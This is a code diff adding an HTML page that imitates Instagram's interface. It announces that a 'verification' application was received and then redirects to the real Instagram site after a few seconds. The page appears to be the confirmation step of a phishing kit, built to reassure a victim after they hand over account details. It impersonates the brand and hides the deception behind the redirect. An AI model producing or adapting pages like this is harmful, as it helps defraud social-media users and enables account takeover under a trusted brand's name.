@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Redirects to real Instagram after 4 seconds -->
+    <meta http-equiv="refresh" content="5;URL=https://www.instagram.com/">
+    <title>Application Received • Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            max-width: 400px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 600;
+            margin: 10px 0;
+            color: #262626;
+        }
+
+        .message {
+            color: #262626;
+            font-size: 14px;
+            line-height: 20px;
+            margin-bottom: 20px;
+        }
+
+        .loader {
+            border: 3px solid #efefef;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <!-- Using a visual indicator for success -->
+        <svg class="check-icon" viewBox="0 0 24 24" fill="#0095f6">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+        </svg>
+        
+        <h2>Application Received</h2>
+        <div class="message">
+            Your request is being reviewed. We will notify you via email within 24 hours regarding the status of your verification.
+        </div>
+
+        <div class="loader"></div>
+        <div style="font-size: 12px; color: #8e8e8e;">Redirecting to Instagram...</div>
+    </div>
+
+</body>
+</html>
